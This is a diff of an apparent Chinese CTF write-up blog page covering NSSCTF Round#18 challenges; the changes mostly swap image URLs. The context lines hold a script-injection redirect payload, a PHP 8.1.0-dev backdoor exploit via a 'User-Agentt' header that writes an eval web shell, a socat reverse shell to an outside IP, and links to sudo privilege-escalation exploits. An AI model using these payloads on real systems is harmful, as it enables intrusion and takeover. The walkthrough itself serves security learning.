@@ -232,7 +232,7 @@
         <section class="flex items-center gap-3 text-sm">
           <span class="flex items-center gap-1">
             <iconify-icon width="18" icon="carbon-calendar" ></iconify-icon>
-            <time>2024-05-05</time>
+            <time>2024-05-06</time>
           </span>
           <span class="text-gray-400">·</span>
           <span class="flex items-center gap-1">
@@ -264,22 +264,22 @@
 <blockquote>
 <p>门酱想玩新游戏了，你能给他下载地址吗？<br>hint1: 启动的页面藏了提示<br>hint2: 与cookie无关，给门酱链接就行了</p>
 </blockquote>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//image-20240217000056745.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061252398.png"></p>
 <p>提示了这个地址：nssctfroundSpring.php</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
 <p>先继续浏览一下其他页面吧首页下</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//QQ%E6%88%AA%E5%9B%BE20240217001053.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061252748.png"></p>
 <p>有一个文本框还有一个评论区</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//QQ%E6%88%AA%E5%9B%BE20240217001223.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061252520.png"></p>
 <p>评论区可以进行评论，结合前面的hint其实大概也能猜出来是XSS了，不过具体xss要干什么还不知道</p>
 <p>因为hint给了与cookie无关，所以猜测可能不是打cookie</p>
 <p>然后要给门酱一个链接，猜测应该是用XSS进行跳转吧</p>
 <p>这里随便给了门酱个链接，例如<a target="_blank" rel="noopener" href="http://www.baidu.com显示要自己的网站/">www.baidu.com显示要自己的网站</a></p>
 <p>刚好符合前面的猜测，进行xss跳转</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//2.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061252772.png"></p>
 <p>拿靶机的网站上去试试</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//3.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061252239.png"></p>
 <p>不再显示</p>
 <p>于是看nssctfroundSpring.php进行xss</p>
 <p>直接进行分析：</p>
@@ -296,7 +296,7 @@
 <p>理论成立，实践开始</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.com&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>&lt;img&quot;1.png 12 /png</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//4.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253511.png"></p>
 <p>然后就直接百度一个跳转语法就好啦</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://genshin.hoyoverse.com/&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
 
@@ -316,14 +316,14 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/words/?title=MQ%3D%3D&amp;content=aHR0cCUzQSUyRiUyRjEuY29tJTIyJTNFJTNDc2NyaXB0JTNFd2luZG93LmxvY2F0aW9uLmhyZWYlM0QnaHR0cHMlM0ElMkYlMkZ5bXp4LnFxLmNvbSUyRiclM0IlM0MlMkZzY3JpcHQlM0UlM0NpbWclMjIxLnBuZyUyMDEyJTIwJTJGcG5n</span><br></pre></td></tr></table></figure>
 
 <p>成功拿到flag：NSSCTF{64844971-41d6-4111-ab66-495df8fb4c15}</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//6.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253073.png"></p>
 <p>好久没打ctf了，没想到越来越脑洞了……</p>
 <h3 id="NSSRound-18-Basic-easy-rw"><a href="#NSSRound-18-Basic-easy-rw" class="headerlink" title="[NSSRound#18 Basic]easy_rw"></a>[NSSRound#18 Basic]easy_rw</h3><p>金币不够做不了  -。-</p>
 <p>占个坑，等我下次金币够了在做吧</p>
 <blockquote>
 <p>题目位置：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5135">NSSRound#18 Basic]easy_rw | NSSCTF</a></p>
 </blockquote>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//7.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253116.png"></p>
 <h3 id="NSSRound-18-Basic-Becomeroot"><a href="#NSSRound-18-Basic-Becomeroot" class="headerlink" title="[NSSRound#18 Basic]Becomeroot"></a>[NSSRound#18 Basic]Becomeroot</h3><blockquote>
 <p>题目位置：[<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5126">NSSRound#18 Basic]Becomeroot | NSSCTF</a></p>
 </blockquote>
@@ -331,10 +331,10 @@
 <p>题目描述：php的开发仓库好像被入侵过</p>
 </blockquote>
 <p>一打开就是一个phpinfo</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319913.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253569.png"></p>
 <p>一脸懵逼，有点抽象，不会又跟前面那个xss一样得寻找蛛丝马迹吧</p>
 <p>往信息泄露这方面去想了想，发现PHP版本是已知的 PHP Version 8.1.0-dev</p>
-<p> <img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319526.png"></p>
+<p> <img src="http://oss.hehanzzz.icu/img/202405061253541.png"></p>
 <p>找到这个PHP版本有后门漏洞，通过发送 User-Agentt 标头来执行任意代码</p>
 <p>那还说什么，直接开测</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev 后门远程命令执行漏洞复现-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
@@ -342,12 +342,12 @@
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumvar_dump(2*3);</span><br></pre></td></tr></table></figure>
 
 <p>成功回显int(6)，漏洞存在</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319777.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253657.png"></p>
 <p>ls看看根目录</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319994.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253155.png"></p>
 <p>根据最开始说的flag在&#x2F;root下，用ls看看</p>
 <p>发现回显空，猜测是不是没权限呀</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319800.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253918.png"></p>
 <p>执行whoami发现是user用户</p>
 <p>判断没权限，难不成ctf得提权了？？？</p>
 <p>不管先，先上shell</p>
@@ -358,7 +358,7 @@
 
 <p>打开1.php，提示</p>
 <p><strong>Parse error</strong>:  syntax error, unexpected end of file, expecting “(“ in <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php(1) : eval()’d code</strong> on line <strong>1</strong></p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319538.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253014.png"></p>
 <p>看来得对$进行转义</p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agentt: zerodiumsystem(&#x27;echo &quot;<span class="meta">&lt;?php @eval(\$_POST[1]);phpinfo();?&gt;</span>&quot;&gt;/var/www/html/1.php&#x27;);</span><br></pre></td></tr></table></figure>
 
@@ -367,33 +367,33 @@
 <p>看一下内核版本：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/*-release</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319136.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253644.png"></p>
 <p>发现是 Ubuntu 20.04.3 LTS</p>
 <p>直接百度Ubuntu 20.04.3 LTS提权，使用<a target="_blank" rel="noopener" href="https://github.com/briskets/CVE-2021-3493/tree/main">CVE-2021-3493</a>提权</p>
 <p>一顿操作猛如虎，结果失败了</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319819.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253642.png"></p>
 <p>没办法，换方法</p>
 <p>往浏览器下翻了一下，发现还有个 CVE-2021-31560 可以试试</p>
 <p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1782930">【漏洞修复】Linux Sudo本地提权漏洞修复（CVE-2021-31560)-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 <p>但是找不到exp，百度这个cve结果发现这篇文章后面多打了一个0  &#x3D;.&#x3D;</p>
 <p>正确的cve应该是：CVE-2021-3156：<a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156.git">https://github.com/blasty/CVE-2021-3156</a></p>
 <p>发现还是不太行</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319495.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253981.png"></p>
 <p>被迫去看官方wp</p>
 <p>发现真的是这个cve，但是上面的poc打不成功</p>
 <p>用官方的poc去打：<a target="_blank" rel="noopener" href="https://github.com/CptGibbon/CVE-2021-3156">CptGibbon&#x2F;CVE-2021-3156: Root shell PoC for CVE-2021-3156 (github.com)</a></p>
 <p>发现也不太ok</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319507.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253708.png"></p>
 <p>猜测应该是得用交互式shell才能提权了，传个socat弹个交互式shell到服务器上</p>
 <p>但是这时候，服务器崩坏了（寄，又得花费30金币）</p>
 <p>重新开了一个靶机 用socat进行交互shell</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:39.108.11.237:2333</span><br></pre></td></tr></table></figure>
 
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319882.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253762.png"></p>
 <p>直接make 然后运行</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319964.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253193.png"></p>
 <p>也是终于成功了www…</p>
-<p><img src="http://sd0ezwsan.hn-bkt.clouddn.com//202405052319111.png"></p>
+<p><img src="http://oss.hehanzzz.icu/img/202405061253933.png"></p>
 <p>NSSCTF{0014fed1-627b-4d93-802c-1ccefda6df75}</p>
 <p>总结一下，这题跟上面的xss一样麻烦（可能是我太菜了吧），但是难度并不难，几个细节还是得注意一下的</p>
 <p>然后就是socat这个命令可以记录一下，看官方wp是直接去使用这个cve也没判断过程（老藏着掖着不写详细）</p>
